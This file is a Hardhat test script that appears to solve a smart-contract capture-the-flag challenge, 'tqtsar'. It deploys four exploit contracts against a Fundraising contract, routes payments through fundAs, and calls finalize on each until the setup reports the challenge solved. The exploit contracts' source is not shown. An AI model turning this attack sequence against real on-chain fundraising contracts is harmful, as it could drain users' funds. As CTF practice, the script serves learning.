import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { expect } from "chai";
import { SETUP_tqtsar, CHALLENGE_tqtsar} from "../../scripts/addresses"


let accounts: Signer[];
let attacker: Signer;
let attackerAddress: string;
let exploit: Contract;
let exploit2: Contract;
let exploit3: Contract;
let exploit4: Contract;
let see: Contract;
let setup: Contract; 
let challenge: Contract;
let tx: any;

before(async () => {
    [attacker] = await ethers.getSigners();
    attackerAddress = await attacker.getAddress();
    setup = (await ethers.getContractAt(`contracts/tqtsar/Setup.sol:Setup`, SETUP_tqtsar)).connect(attacker);
    challenge = (await ethers.getContractAt(`contracts/tqtsar/Fundraising.sol:Fundraising`, CHALLENGE_tqtsar)).connect(attacker);
});

it("prints contract address", async function () {
    expect(await setup.instance()).to.eq(CHALLENGE_tqtsar);
});

it.skip("info", async function () {
});

it("exploit", async () => {
    exploit = await (await ethers.getContractFactory(`contracts/tqtsar/Exploit.sol:Exploit`, attacker)).deploy(challenge.address);
    exploit2 = await (await ethers.getContractFactory(`contracts/tqtsar/Exploit.sol:Exploit2`, attacker)).deploy(challenge.address);
    exploit3 = await (await ethers.getContractFactory(`contracts/tqtsar/Exploit.sol:Exploit3`, attacker)).deploy(challenge.address);
    exploit4 = await (await ethers.getContractFactory(`contracts/tqtsar/Exploit.sol:Exploit4`, attacker)).deploy(challenge.address);
    see = await (await ethers.getContractFactory(`contracts/tqtsar/Exploit.sol:See`, attacker)).deploy(challenge.address);
    let exploitAddress = exploit.address;
    let exploitAddress2 = exploit2.address;
    let exploitAddress3 = exploit3.address;
    let exploitAddress4 = exploit4.address;

    console.log((await see.lookBalance()).toString());
    console.log((await see.lookCollaborations(attackerAddress)).toString());
    console.log((await see.lookCollaborations(exploitAddress)).toString());
    console.log((await see.lookCollaborations(exploitAddress2)).toString());
    console.log((await see.lookCollaborations(exploitAddress3)).toString());
    console.log((await see.lookCollaborations(exploitAddress4)).toString());

    
    await challenge.connect(attacker).fund({value: await ethers.utils.parseUnits("1700.0","gwei")}); // 2800
    await challenge.fundAs(exploitAddress, {value: await ethers.utils.parseUnits("800.0","gwei")}); // 2100
    await exploit.finalize();
    await challenge.fundAs(exploitAddress2, {value: await ethers.utils.parseUnits("800.0","gwei")}); // 1400
    await exploit2.finalize();
    await challenge.fundAs(exploitAddress3, {value: await ethers.utils.parseUnits("800.0","gwei")}); // 0
    await exploit3.finalize();
    await challenge.fundAs(exploitAddress4, {value: await ethers.utils.parseUnits("800.0","gwei")}); // 700
    await exploit4.finalize();
    expect(await setup.isSolved()).to.eq(true);
    
});